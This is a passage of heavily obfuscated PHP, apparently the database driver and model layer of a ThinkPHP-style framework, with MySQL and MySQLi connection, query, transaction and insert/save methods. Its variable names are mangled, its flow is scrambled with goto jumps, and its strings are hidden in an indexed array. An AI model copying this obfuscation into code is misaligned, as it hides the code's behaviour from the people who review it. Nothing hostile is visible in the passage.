$fÁ˜’ºë»ê[] = $a¢ÜšÖĞÚ[257] . implode($a¢ÜšÖĞÚ[47], $f—ÆÊ™º«¿) . $a¢ÜšÖĞÚ[849]; } array_walk($dà¸´êîí‘, array($this, $a¢ÜšÖĞÚ[850])); goto EÍÇ±í¥; a¼…–¥‘èÊ: $a¢ÜšÖĞÚ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!is_array($bñªìŒ™èÍ[0])) { return !1; } $dà¸´êîí‘ = array_keys($bñªìŒ™èÍ[0]); goto bÎ©£æ„•…; EÍÇ±í¥: $eÜ¯ì¹¢Ü = ($fõÁÒ¬èĞÍ ? $a¢ÜšÖĞÚ[851] : $a¢ÜšÖĞÚ[852]) . $a¢ÜšÖĞÚ[853] . $this->parseTable($C‚Æ›æË•º[$a¢ÜšÖĞÚ[276]]) . $a¢ÜšÖĞÚ[847] . implode($a¢ÜšÖĞÚ[47], $dà¸´êîí‘) . $a¢ÜšÖĞÚ[854] . implode($a¢ÜšÖĞÚ[47], $fÁ˜’ºë»ê); return $this->execute($eÜ¯ì¹¢Ü); goto F¬×ª¾Œ†÷; F¬×ª¾Œ†÷: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $f±ØÉ¾Ûª  =& $_SERVER[Ïº«‚ßèÔˆø]; $this->error = mysql_errno() . $f±ØÉ¾Ûª [4] . mysql_error($this->_linkID); if ($f±ØÉ¾Ûª [33] != $this->queryStr) { $this->error .= LNG($f±ØÉ¾Ûª [45]) . $this->queryStr; } think_trace($this->error, $f±ØÉ¾Ûª [33], $f±ØÉ¾Ûª [46]); return $this->error; } public function escapeString($E¼±¡¦¢½¨) { if ($this->_linkID) { return mysql_real_escape_string($E¼±¡¦¢½¨, $this->_linkID); } else { return mysql_escape_string($E¼±¡¦¢½¨); } } public function parseKey(&$d­—İ—½ª, $c¯œ¯á¾·â = true) { $fìÏßŞÒ© =& $_SERVER[Ïº«‚ßèÔˆø]; if ($c¯œ¯á¾·â) { $d­—İ—½ª = $this->parseKeyCheck($d­—İ—½ª); } if ($d­—İ—½ª != $fìÏßŞÒ©[182] && !preg_match($fìÏßŞÒ©[855], $d­—İ—½ª)) { $d­—İ—½ª = $fìÏßŞÒ©[381] . trim($d­—İ—½ª, $fìÏßŞÒ©[381]) . $fìÏßŞÒ©[381]; } return $d­—İ—½ª; } } class DbMysqli extends Db { public function __construct($dĞ½‹ˆµ¬Å = '') { $cÔ“™ñé =& $_SERVER[Ïº«‚ßèÔˆø]; if (!extension_loaded($cÔ“™ñé[742])) { think_exception(think_lang($cÔ“™ñé[10]) . $cÔ“™ñé[856]); } if (!empty($dĞ½‹ˆµ¬Å)) { $this->config = $dĞ½‹ˆµ¬Å; if (empty($this->config[$cÔ“™ñé[13]])) { $this->config[$cÔ“™ñé[13]] = $cÔ“™ñé[33]; } } } public function connect($AÑ…Š„‹Åö = '', $AÅç´öÃÌ = 0) { $b·—Ó²˜Ñ× =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($this->linkID[$AÅç´öÃÌ])) { goto bíº÷¦ÉÍ; AŞ…ÕÅ¨ôæ: $A¾ŒË»ÖŠÚ = $this->linkID[$AÅç´öÃÌ]->server_version; $this->linkID[$AÅç´öÃÌ]->query($b·—Ó²˜Ñ×[834] . think_config($b·—Ó²˜Ñ×[835]) . $b·—Ó²˜Ñ×[55]); if ($A¾ŒË»ÖŠÚ > $b·—Ó²˜Ñ×[836]) { $this->linkID[$AÅç´öÃÌ]->query($b·—Ó²˜Ñ×[837]); } goto BÉ¬÷ÌÏÌ; bíº÷¦ÉÍ: if (empty($AÑ…Š„‹Åö)) { $AÑ…Š„‹Åö = $this->config; } $this->linkID[$AÅç´öÃÌ] = new mysqli($AÑ…Š„‹Åö[$b·—Ó²˜Ñ×[830]], $AÑ…Š„‹Åö[$b·—Ó²˜Ñ×[832]], $AÑ…Š„‹Åö[$b·—Ó²˜Ñ×[833]], $AÑ…Š„‹Åö[$b·—Ó²˜Ñ×[17]], $AÑ…Š„‹Åö[$b·—Ó²˜Ñ×[831]] ? intval($AÑ…Š„‹Åö[$b·—Ó²˜Ñ×[831]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto AŞ…ÕÅ¨ôæ; BÉ¬÷ÌÏÌ: $this->connected = !0; if (1 != think_config($b·—Ó²˜Ñ×[18])) { unset($this->config); } goto EîŒØ™ŸÎ; EîŒØ™ŸÎ: } return $this->linkID[$AÅç´öÃÌ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($d¶ššŒÆ¸È) { goto D›„„­óÁ¾; Fñæ‘½„ì‡: think_status($cƒˆì…ï¸Ï[20]); $this->queryID = $this->_linkID->query($d¶ššŒÆ¸È); if ($this->_linkID->more_results()) { while (($D˜ØêÖò½¢ = $this->_linkID->next_result()) != NULL) { $D˜ØêÖò½¢->free_result(); } } goto Fšœ×±±ŠË; B×¿¢«êÒ³: $this->queryStr = $d¶ššŒÆ¸È; if ($this->queryID) { $this->free(); } think_action_status($cƒˆì…ï¸Ï[19], 1); goto Fñæ‘½„ì‡; D›„„­óÁ¾: $cƒˆì…ï¸Ï =& $_SERVER[Ïº«‚ßèÔˆø]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B×¿¢«êÒ³; Fšœ×±±ŠË: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto fˆå„ĞÏ‹Ë; fˆå„ĞÏ‹Ë: } public function execute($AŸè‰¨´ô³) { goto cĞØ½¬‹¸¦; eàÂùĞ²õø: if (!1 === $C¿ï¹ÆÒÉ©) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto F„ğ™å¢¼Û; Cñ£ãÓé¦: think_status($Cƒ—‘®…ë˜[20]); $C¿ï¹ÆÒÉ© = $this->_linkID->query($AŸè‰¨´ô³); $this->debug(); goto eàÂùĞ²õø; b²ŸîÆ¹Æ: $this->queryStr = $AŸè‰¨´ô³; if ($this->queryID) { $this->free(); } think_action_status($Cƒ—‘®…ë˜[21], 1); goto Cñ£ãÓé¦; cĞØ½¬‹¸¦: $Cƒ—‘®…ë˜ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b²ŸîÆ¹Æ; F„ğ™å¢¼Û: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cİ›É®ƒëê = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$cİ›É®ƒëê) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D›º“¿Êİ© = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D›º“¿Êİ©) { $this->error(); return !1; } } return !0; } private function getAll() { $e¢«ğòÊ¡È = array(); if ($this->numRows > 0) { for ($eÖµÔÏœŠÈ = 0; $eÖµÔÏœŠÈ < $this->numRows; $eÖµÔÏœŠÈ++) { $e¢«ğòÊ¡È[$eÖµÔÏœŠÈ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $e¢«ğòÊ¡È; } public function getFields($fÇ–«É”«) { $F¾ùÑÙ²Ñ¾ =& $_SERVER[Ïº«‚ßèÔˆø]; $F’±£êÛ = $this->query($F¾ùÑÙ²Ñ¾[841] . $this->parseKey($fÇ–«É”«)); $aŠîÊß¶Ø¤ = array(); if ($F’±£êÛ) { foreach ($F’±£êÛ as $D•‡–ï¤âŸ => $c­ĞÆ²»İ) { $aŠîÊß¶Ø¤[$c­ĞÆ²»İ[$F¾ùÑÙ²Ñ¾[27]]] = array($F¾ùÑÙ²Ñ¾[28] => $c­ĞÆ²»İ[$F¾ùÑÙ²Ñ¾[27]], $F¾ùÑÙ²Ñ¾[29] => $c­ĞÆ²»İ[$F¾ùÑÙ²Ñ¾[30]], $F¾ùÑÙ²Ñ¾[31] => (bool) ($c­ĞÆ²»İ[$F¾ùÑÙ²Ñ¾[32]] === $F¾ùÑÙ²Ñ¾[33]), $F¾ùÑÙ²Ñ¾[34] => $c­ĞÆ²»İ[$F¾ùÑÙ²Ñ¾[35]], $F¾ùÑÙ²Ñ¾[36] => strtolower($c­ĞÆ²»İ[$F¾ùÑÙ²Ñ¾[37]]) == $F¾ùÑÙ²Ñ¾[38], $F¾ùÑÙ²Ñ¾[39] => strtolower($c­ĞÆ²»İ[$F¾ùÑÙ²Ñ¾[40]]) == $F¾ùÑÙ²Ñ¾[41]); } } return $aŠîÊß¶Ø¤; } public function getTables($A† ¥·Œ·Ò = '') { $b½¨èÒîôè =& $_SERVER[Ïº«‚ßèÔˆø]; $AÑ ğ‘ßñ© = !empty($A† ¥·Œ·Ò) ? $b½¨èÒîôè[843] . $A† ¥·Œ·Ò . $b½¨èÒîôè[844] : $b½¨èÒîôè[845]; $cÂ£ŞÒ”Û = $this->query($AÑ ğ‘ßñ©); $cê·ø‹ÌÇ = array(); if ($cÂ£ŞÒ”Û) { foreach ($cÂ£ŞÒ”Û as $BÌÚ Êß¬ => $B±Ô³çŸ) { $cê·ø‹ÌÇ[$BÌÚ Êß¬] = current($B±Ô³çŸ); } } return $cê·ø‹ÌÇ; } public function replace($A××Ò¶–Ğí, $fè·ÉÙ ß = array()) { $eÄÌ®Ç³‹ =& $_SERVER[Ïº«‚ßèÔˆø]; foreach ($A××Ò¶–Ğí as $F‚Ã‡·§÷ => $fÔø­‚Â ) { $fÂáôø† = $this->parseValue($fÔø­‚Â ); if (is_scalar($fÂáôø†)) { $e»ŸàÖŞœ¦[] = $fÂáôø†; $DŒÌğ¾‰È[] = $this->parseKey($F‚Ã‡·§÷); } } $E—É›‰¤š = $eÄÌ®Ç³‹[846] . $this->parseTable($fè·ÉÙ ß[$eÄÌ®Ç³‹[276]]) . $eÄÌ®Ç³‹[847] . implode($eÄÌ®Ç³‹[47], $DŒÌğ¾‰È) . $eÄÌ®Ç³‹[848] . implode($eÄÌ®Ç³‹[47], $e»ŸàÖŞœ¦) . $eÄÌ®Ç³‹[849]; return $this->execute($E—É›‰¤š); } public function insertAll($Däø¿åÏ, $c¤¸ÈÕ°ãÒ = array(), $b©öÑ’§İê = false) { goto BİãöàÔ¯â; BİãöàÔ¯â: $A‘½‚­å =& $_SERVER[Ïº«‚ßèÔˆø]; if (!is_array($Däø¿åÏ[0])) { return !1; } $bõ‚‡¾ÑË´ = array_keys($Däø¿åÏ[0]); goto A¨ÓÄÈˆÑæ; A¨ÓÄÈˆÑæ: $C„×¨ªÈ‹ = array(); foreach ($Däø¿åÏ as $FÀæ†½‹Š‰) { $cÜ“Åä†™ = array(); foreach ($FÀæ†½‹Š‰ as $D»Âó¯µí => $BÒ·„è„‹«) { $BÒ·„è„‹« = $this->parseValue($BÒ·„è„‹«); if (is_scalar($BÒ·„è„‹«)) { $cÜ“Åä†™[] = $BÒ·„è„‹«; } } $C„×¨ªÈ‹[] = $A‘½‚­å[257] . implode($A‘½‚­å[47], $cÜ“Åä†™) . $A‘½‚­å[849]; } array_walk($bõ‚‡¾ÑË´, array($this, $A‘½‚­å[850])); goto dè¦¿ì‰²é; dè¦¿ì‰²é: $AÀëñ¯ ‹é = $b©öÑ’§İê ? $A‘½‚­å[851] : $A‘½‚­å[852]; $C‰ßï“ª– = $AÀëñ¯ ‹é . $A‘½‚­å[853] . $this->parseTable($c¤¸ÈÕ°ãÒ[$A‘½‚­å[276]]) . $A‘½‚­å[847] . implode($A‘½‚­å[47], $bõ‚‡¾ÑË´) . $A‘½‚­å[854] . implode($A‘½‚­å[47], $C„×¨ªÈ‹); return $this->execute($C‰ßï“ª–); goto A÷ÉÅè¹À²; A÷ÉÅè¹À²: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $d—Ìõ±óŒÄ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->error = $this->_linkID->errno . $d—Ìõ±óŒÄ[4] . $this->_linkID->error; if ($d—Ìõ±óŒÄ[33] != $this->queryStr) { $this->error .= LNG($d—Ìõ±óŒÄ[45]) . $this->queryStr; } think_trace($this->error, $d—Ìõ±óŒÄ[33], $d—Ìõ±óŒÄ[46]); return $this->error; } public function escapeString($cËÌö§´ŒÖ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($cËÌö§´ŒÖ); } else { return addslashes($cËÌö§´ŒÖ); } } public function parseKey(&$E‚Úá Ş©¦, $cŠä±Õ²È¬ = true) { $b­ÍÙ‡ö =& $_SERVER[Ïº«‚ßèÔˆø]; if ($cŠä±Õ²È¬) { $E‚Úá Ş©¦ = $this->parseKeyCheck($E‚Úá Ş©¦); } if ($E‚Úá Ş©¦ != $b­ÍÙ‡ö[182] && !preg_match($b­ÍÙ‡ö[855], $E‚Úá Ş©¦)) { $E‚Úá Ş©¦ = $b­ÍÙ‡ö[381] . trim($E‚Úá Ş©¦, $b­ÍÙ‡ö[381]) . $b­ÍÙ‡ö[381]; } return $E‚Úá Ş©¦; } } goto AßßÆšê¤µ; B‘‡ß©—¤: define($_SERVER[Ïº«‚ßèÔˆø][239], 0); define($_SERVER[Ïº«‚ßèÔˆø][240], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\145", "\x6f\162\x64\145\x72", "\141\x6c\x69\x61\163", "\x68\141\x76\x69\x6e\147", "\x67\162\x6f\x75\160", "\154\x6f\143\153", "\144\x69\x73\x74\x69\x6e\143\164", "\x61\x75\x74\x6f", "\x66\151\x6c\x74\145\162", "\x76\141\154\x69\144\x61\x74\x65", "\x72\145\x73\165\x6c\x74", "\x62\x69\x6e\x64", "\x74\157\153\145\x6e"); public function __construct($FÎòâÊÑ†¼ = '', $C“—Ú»ùİ˜ = '', $b¬¦ÑÉ©æù = '') { $a¹ƒ¢…ó„ˆ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->_initialize(); if (!empty($FÎòâÊÑ†¼)) { if (strpos($FÎòâÊÑ†¼, $a¹ƒ¢…ó„ˆ[95])) { list($this->dbName, $this->name) = explode($a¹ƒ¢…ó„ˆ[95], $FÎòâÊÑ†¼); } else { $this->name = $FÎòâÊÑ†¼; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($C“—Ú»ùİ˜)) { $this->tablePrefix = $a¹ƒ¢…ó„ˆ[33]; } elseif ($a¹ƒ¢…ó„ˆ[33] != $C“—Ú»ùİ˜) { $this->tablePrefix = $C“—Ú»ùİ˜; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($a¹ƒ¢…ó„ˆ[241]); } $this->db(0, empty($this->connection) ? $b¬¦ÑÉ©æù : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $b‘Éùã çÃ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($this->fields)) { if (think_config($b‘Éùã çÃ[242])) { $eŠÈß»¦Ø„ = $this->dbName ? $this->dbName : think_config($b‘Éùã çÃ[243]); $FÈâİìêŒ¿ = think_var_cache($b‘Éùã çÃ[244] . strtolower(get_path_this($eŠÈß»¦Ø„) . $b‘Éùã çÃ[95] . $this->name)); if ($FÈâİìêŒ¿) { $cµã™î˜ãÍ = think_config($b‘Éùã çÃ[245]); if (empty($cµã™î˜ãÍ) || $FÈâİìêŒ¿[$b‘Éùã çÃ[246]] == $cµã™î˜ãÍ) { $this->fields = $FÈâİìêŒ¿; return; } } } $this->flush(); } } public function flush() { goto cšÒãŞ©Ü†; E¬…Öä‡ùÓ: foreach ($eãÈø½Ÿ‘â as $fâ¿¬æÁ‚‰ => $Aƒ¬Ó‰Â§¤) { $Bºğ¡Æù‹¶[$fâ¿¬æÁ‚‰] = $Aƒ¬Ó‰Â§¤[$bšŸğøº°[29]]; if ($Aƒ¬Ó‰Â§¤[$bšŸğøº°[36]]) { $this->fields[$bšŸğøº°[248]] = $fâ¿¬æÁ‚‰; if ($Aƒ¬Ó‰Â§¤[$bšŸğøº°[39]]) { $this->fields[$bšŸğøº°[247]] = !0; } } } $this->fields[$bšŸğøº°[249]] = $Bºğ¡Æù‹¶; if (think_config($bšŸğøº°[245])) { $this->fields[$bšŸğøº°[246]] = think_config($bšŸğøº°[245]); } goto d´¦êÙÍ; d´¦êÙÍ: if (think_config($bšŸğøº°[242])) { $D†ù¢ÇÜ÷„ = $this->dbName ? $this->dbName : think_config($bšŸğøº°[243]); think_var_cache($bšŸğøº°[244] . strtolower(get_path_this($D†ù¢ÇÜ÷„) . $bšŸğøº°[95] . $this->name), $this->fields); } goto eÁ…ó£è¤¶; cšÒãŞ©Ü†: $bšŸğøº° =& $_SERVER[Ïº«‚ßèÔˆø]; $this->db->setModel($this->name); $eãÈø½Ÿ‘â = $this->db->getFields($this->getTableName()); goto Cˆ¿Õ£¦„¦; Cˆ¿Õ£¦„¦: if (!$eãÈø½Ÿ‘â) { return !1; } $this->fields = array_keys($eãÈø½Ÿ‘â); $this->fields[$bšŸğøº°[247]] = !1; goto E¬…Öä‡ùÓ; eÁ…ó£è¤¶: } public function switchModel($F¯×ĞÑëĞä, $E‘ ÊöÛ = array()) { $f±­—ù»“ì =& $_SERVER[Ïº«‚ßèÔˆø]; $fĞ‰¶‰ÆÄ¬ = ucwords(strtolower($F¯×ĞÑëĞä)) . $f±­—ù»“ì[250]; if (!class_exists($fĞ‰¶‰ÆÄ¬)) { think_exception($fĞ‰¶‰ÆÄ¬ . think_lang($f±­—ù»“ì[251])); } $this->_extModel = new $fĞ‰¶‰ÆÄ¬($this->name); if (!empty($E‘ ÊöÛ)) { foreach ($E‘ ÊöÛ as $E¨‘¾­‚„Ô) { $this->_extModel->setProperty($E¨‘¾­‚„Ô, $this->{$E¨‘¾­‚„Ô}); } } return $this->_extModel; } public function __set($d¿åËŒ†¡È, $DïĞ†ò”‡ô) { $this->data[$d¿åËŒ†¡È] = $DïĞ†ò”‡ô; } public function __get($E¼çÌÁ¡Ç‘) { return isset($this->data[$E¼çÌÁ¡Ç‘]) ? $this->data[$E¼çÌÁ¡Ç‘] : null; } public function __isset($cĞ‹§…›†) { return isset($this->data[$cĞ‹§…›†]); } public function __unset($AÜ°Îˆ¾™‘) { unset($this->data[$AÜ°Îˆ¾™‘]); } public function __call($aÓ¨‰òÚ¦Ò, $AÄƒĞ‚á¢®) { $AÏ…×œ×‘ =& $_SERVER[Ïº«‚ßèÔˆø]; if (in_array(strtolower($aÓ¨‰òÚ¦Ò), $this->methods, !0)) { $this->options[strtolower($aÓ¨‰òÚ¦Ò)] = $AÄƒĞ‚á¢®[0]; return $this; } elseif (in_array(strtolower($aÓ¨‰òÚ¦Ò), array($AÏ…×œ×‘[252], $AÏ…×œ×‘[253], $AÏ…×œ×‘[254], $AÏ…×œ×‘[255], $AÏ…×œ×‘[256]), !0)) { $e•¶Ê·Ó„Ğ = isset($AÄƒĞ‚á¢®[0]) ? $AÄƒĞ‚á¢®[0] : $AÏ…×œ×‘[182]; $e•¶Ê·Ó„Ğ = $this->db->parseKey($e•¶Ê·Ó„Ğ); return $this->getField(strtoupper($aÓ¨‰òÚ¦Ò) . $AÏ…×œ×‘[257] . $e•¶Ê·Ó„Ğ . $AÏ…×œ×‘[258] . $aÓ¨‰òÚ¦Ò, $AÏ…×œ×‘[252]); } elseif (strtolower(substr($aÓ¨‰òÚ¦Ò, 0, 5)) == $AÏ…×œ×‘[259]) { $e•¶Ê·Ó„Ğ = think_parse_name(substr($aÓ¨‰òÚ¦Ò, 5)); $dêé‘©¢Šè[$e•¶Ê·Ó„Ğ] = $AÄƒĞ‚á¢®[0]; return $this->where($dêé‘©¢Šè)->find(); } elseif (strtolower(substr($aÓ¨‰òÚ¦Ò, 0, 10)) == $AÏ…×œ×‘[260]) { $F»è—˜Õ = think_parse_name(substr($aÓ¨‰òÚ¦Ò, 10)); $dêé‘©¢Šè[$F»è—˜Õ] = $AÄƒĞ‚á¢®[0]; return $this->where($dêé‘©¢Šè)->getField($AÄƒĞ‚á¢®[1]); } elseif (isset($this->_scope[$aÓ¨‰òÚ¦Ò])) { return $this->scope($aÓ¨‰òÚ¦Ò, $AÄƒĞ‚á¢®[0]); } elseif (method_exists($this, $aÓ¨‰òÚ¦Ò)) { array_unshift($AÄƒĞ‚á¢®, $aÓ¨‰òÚ¦Ò); return call_user_func_array(array($this, $AÏ…×œ×‘[261]), $AÄƒĞ‚á¢®); } else { return call_user_func_array(array(parent, $aÓ¨‰òÚ¦Ò), $AÄƒĞ‚á¢®); } } protected function call() { goto c¾Ò‘ÀÌô«; dŞ†´íõË°: $Eîéˆæ„ë = $e†³ñéƒ¢‚; if (is_array($e†³ñéƒ¢‚)) { $Eîéˆæ„ë = $e†³ñéƒ¢‚[1]; $e†³ñéƒ¢‚ = $e†³ñéƒ¢‚[0]; } $f‚ÕĞ‰Ëè = count($E–…ä’• İ) - 1; goto A—Ğ¡°Çİ˜; d»Â´ª¼ËŒ: $a„¤œ©ù¬Ÿ = call_user_func_array(array($this, $e†³ñéƒ¢‚), $E–…ä’• İ); if (method_exists($this, $föÑì†Åì[265])) { $dãÉÇˆÔºÒ = call_user_func_array(array($this, $föÑì†Åì[266]), array($Eîéˆæ„ë, $E–…ä’• İ, $a„¤œ©ù¬Ÿ)); if ($dãÉÇˆÔºÒ) { return $dãÉÇˆÔºÒ; } } return $a„¤œ©ù¬Ÿ; goto fĞíÁ‡ê®Ê; A—Ğ¡°Çİ˜: if (isset($E–…ä’• İ[$f‚ÕĞ‰Ëè]) && $E–…ä’• İ[$f‚ÕĞ‰Ëè] === $e†³ñéƒ¢‚) { think_exception(__CLASS__ . $föÑì†Åì[4] . $e†³ñéƒ¢‚ . think_lang($föÑì†Åì[262])); return; } $E–…ä’• İ[] = $e†³ñéƒ¢‚; if (method_exists($this, $föÑì†Åì[263])) { $dãÉÇˆÔºÒ = call_user_func_array(array($this, $föÑì†Åì[264]), array($Eîéˆæ„ë, $E–…ä’• İ)); if (!is_null($dãÉÇˆÔºÒ) && $dãÉÇˆÔºÒ !== !1) { return $dãÉÇˆÔºÒ; } } goto d»Â´ª¼ËŒ; c¾Ò‘ÀÌô«: $föÑì†Åì =& $_SERVER[Ïº«‚ßèÔˆø]; $E–…ä’• İ = func_get_args(); $e†³ñéƒ¢‚ = array_shift($E–…ä’• İ); goto dŞ†´íõË°; fĞíÁ‡ê®Ê: } protected function _initialize() { } protected function _facade($E•òŞ«‹Ñ) { $C³¶¡Œ¯‘å =& $_SERVER[Ïº«‚ßèÔˆø]; if (!empty($this->fields)) { foreach ($E•òŞ«‹Ñ as $d´Øä·ïå => $bâˆø´¸¦ø) { if (is_array($this->fields) && !in_array($d´Øä·ïå, $this->fields, !0)) { unset($E•òŞ«‹Ñ[$d´Øä·ïå]); } elseif (is_scalar($bâˆø´¸¦ø)) { $this->_parseType($E•òŞ«‹Ñ, $d´Øä·ïå); } } } if (!empty($this->options[$C³¶¡Œ¯‘å[267]])) { $E•òŞ«‹Ñ = array_map($this->options[$C³¶¡Œ¯‘å[267]], $E•òŞ«‹Ñ); unset($this->options[$C³¶¡Œ¯‘å[267]]); } $this->_beforeWrite($E•òŞ«‹Ñ); return $E•òŞ«‹Ñ; } protected function _beforeWrite(&$DÎ–ÕµÏçÅ) { } public function add($EŒ¦¤†¼Ö = '', $f¿‘¬¡‹‰  = array(), $BÛµ¼ğ‹Ø• = false) { goto fà¥óäöÄŞ; E¢¢¥¨Ó¬í: return $C¢êÂˆ…•†; goto bßÏ˜Ã†ìÖ; AÅ’Ü¡Ï: if (!1 === $this->_beforeInsert($EŒ¦¤†¼Ö, $f¿‘¬¡‹‰ )) { return !1; } $C¢êÂˆ…•† = $this->db->insert($EŒ¦¤†¼Ö, $f¿‘¬¡‹‰ , $BÛµ¼ğ‹Ø•); if (!1 !== $C¢êÂˆ…•†) { $dŞİ˜«Óƒ˜ = $this->getLastInsID(); if ($dŞİ˜«Óƒ˜) { $EŒ¦¤†¼Ö[$this->getPk()] = $dŞİ˜«Óƒ˜; $this->_after_insert($EŒ¦¤†¼Ö, $f¿‘¬¡‹‰ ); return $dŞİ˜«Óƒ˜; } $this->_after_insert($EŒ¦¤†¼Ö, $f¿‘¬¡‹‰ ); } goto E¢¢¥¨Ó¬í; fà¥óäöÄŞ: if (empty($EŒ¦¤†¼Ö)) { if (!empty($this->data)) { $EŒ¦¤†¼Ö = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ïº«‚ßèÔˆø][268]); return !1; } } $f¿‘¬¡‹‰  = $this->_parseOptions($f¿‘¬¡‹‰ ); $EŒ¦¤†¼Ö = $this->_facade($EŒ¦¤†¼Ö); goto AÅ’Ü¡Ï; bßÏ˜Ã†ìÖ: } protected function _beforeInsert(&$CŒ¥ÜÄ¼Ï£, $Dì¾¢İó) { } protected function _after_insert($FÍ¤ôÄ‚ñ, $A‚Õ½î°Ÿ¿) { } public function addAll($bŠ¤¥õ ÷, $bùÛ¬¯‰‰ = array(), $A¡¬îË˜¥÷ = false) { goto e‡§©ºÒœ; D» á¼Á—¿: foreach ($bŠ¤¥õ ÷ as $Eù±…ÛÏ“§ => $fßëËç”˜Ş) { $bŠ¤¥õ ÷[$Eù±…ÛÏ“§] = $this->_facade($fßëËç”˜Ş); } if (method_exists($this->db, $f¼³Ê§“[269])) { $AÚêòèé†¢ = $this->db->insertAll($bŠ¤¥õ ÷, $bùÛ¬¯‰‰, $A¡¬îË˜¥÷); } else { $this->startTrans(); foreach ($bŠ¤¥õ ÷ as $Eù±…ÛÏ“§ => $fßëËç”˜Ş) { $AÚêòèé†¢ = $this->db->insert($fßëËç”˜Ş, $bùÛ¬¯‰‰, $A¡¬îË˜¥÷); } $this->commit(); } if (!1 !== $AÚêòèé†¢) { $e¢¬ëÌ¦Ò‚ = $this->getLastInsID(); if ($e¢¬ëÌ¦Ò‚) { return $e¢¬ëÌ¦Ò‚; } } goto CÓ¯ĞíÓ˜; e‡§©ºÒœ: $f¼³Ê§“ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($bŠ¤¥õ ÷)) { $this->error = think_lang($f¼³Ê§“[268]); return !1; } $bùÛ¬¯‰‰ = $this->_parseOptions($bùÛ¬¯‰‰); goto D» á¼Á—¿; CÓ¯ĞíÓ˜: return $AÚêòèé†¢; goto f•—ÏÍ•´Ï; f•—ÏÍ•´Ï: } public function selectAdd($D¼«øõÔÂ¤ = '', $bï§ã¨”¬› = '', $aöÔ°‚äÃ = array()) { $béÏŸ“†ëä =& $_SERVER[Ïº«‚ßèÔˆø]; $aöÔ°‚äÃ = $this->_parseOptions($aöÔ°‚äÃ); if (!1 === ($Fâ²Ï»é = $this->db->selectInsert($D¼«øõÔÂ¤ ? $D¼«øõÔÂ¤ : $aöÔ°‚äÃ[$béÏŸ“†ëä[270]], $bï§ã¨”¬› ? $bï§ã¨”¬› : $this->getTableName(), $aöÔ°‚äÃ))) { $this->error = think_lang($béÏŸ“†ëä[271]); return !1; } else { return $Fâ²Ï»é; } } public function save($aÉ»ë‰æÈô = '', $AÌ¡š®ô¸Ş = array()) { goto bØîÙ×Ú; d…ƒÎœìÅÅ: $AÌ¡š®ô¸Ş = $this->_parseOptions($AÌ¡š®ô¸Ş); $CêÙ®Æï›Í = $this->getPk(); if (!isset($AÌ¡š®ô¸Ş[$D»Õ…œÓÌ[272]])) { if (isset($aÉ»ë‰æÈô[$CêÙ®Æï›Í])) { $DîÒ‹ÆÇÅ[$CêÙ®Æï›Í] = $aÉ»ë‰æÈô[$CêÙ®Æï›Í]; $AÌ¡š®ô¸Ş[$D»Õ…œÓÌ[272]] = $DîÒ‹ÆÇÅ; unset($aÉ»ë‰æÈô[$CêÙ®Æï›Í]); } else { $this->error = think_lang($D»Õ…œÓÌ[271]); return !1; } } goto eƒ©»Ôé«; CøãõÌëÊ: if (!1 !== $bŠÔñ™­óÖ) { if (isset($aïÁÓ´´‘ )) { $aÉ»ë‰æÈô[$CêÙ®Æï›Í] = $aïÁÓ´´‘ ; } $this->_afterUpdate($aÉ»ë‰æÈô, $AÌ¡š®ô¸Ş); } return $bŠÔñ™­óÖ; goto dÁ³‚á¥ğ; eƒ©»Ôé«: if (is_array($AÌ¡š®ô¸Ş[$D»Õ…œÓÌ[272]]) && isset($AÌ¡š®ô¸Ş[$D»Õ…œÓÌ[272]][$CêÙ®Æï›Í])) { $aïÁÓ´´‘  = $AÌ¡š®ô¸Ş[$D»Õ…œÓÌ[272]][$CêÙ®Æï›Í]; } if (!1 === $this->_beforeUpdate($aÉ»ë‰æÈô, $AÌ¡š®ô¸Ş)) { return !1; } $bŠÔñ™­óÖ = $this->db->update($aÉ»ë‰æÈô, $AÌ¡š®ô¸Ş); goto CøãõÌëÊ; bØîÙ×Ú: $D»Õ…œÓÌ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($aÉ»ë‰æÈô)) { if (!empty($this->data)) { $aÉ»ë‰æÈô = $this->data; $this->data = array(); } else { $this->error = think_lang($D»Õ…œÓÌ[268]); return !1; } } $aÉ»ë‰æÈô = $this->_facade($aÉ»ë‰æÈô); goto d…ƒÎœìÅÅ; dÁ³‚á¥ğ: } protected function 